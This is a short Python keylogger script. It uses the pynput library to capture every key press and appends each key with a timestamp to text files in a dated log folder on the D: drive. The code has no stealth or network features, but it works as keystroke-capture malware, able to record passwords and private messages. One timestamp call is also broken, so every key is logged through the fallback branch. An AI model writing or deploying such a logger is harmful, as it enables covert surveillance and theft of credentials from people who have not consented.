import os
from pynput import keyboard
from datetime import datetime

start_datetime = datetime.now()
start_date = str(start_datetime.date())
start_time = start_datetime.time().strftime("%H-%M-%S")

try:
    os.chdir(f'D:/Python/Keylogger/logs/{start_date}/')
except:
    os.chdir('D:/Python/Keylogger/logs/')
    os.mkdir(f"{start_date}")
    os.chdir(f'D:/Python/Keylogger/logs/{start_date}/')


with open(f'{start_time}.txt', 'a') as f:

    def on_press(key):
        try:
            # print((f"{str(datetime.time())} - {key.char}"))
            f.writelines(f"{str(datetime.time())} - {key.char}\n")
            f.flush()
        except:
            f.writelines(f"{str(datetime.now().time())} - {key}\n")
            f.flush()

    def on_release(key):
        pass

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
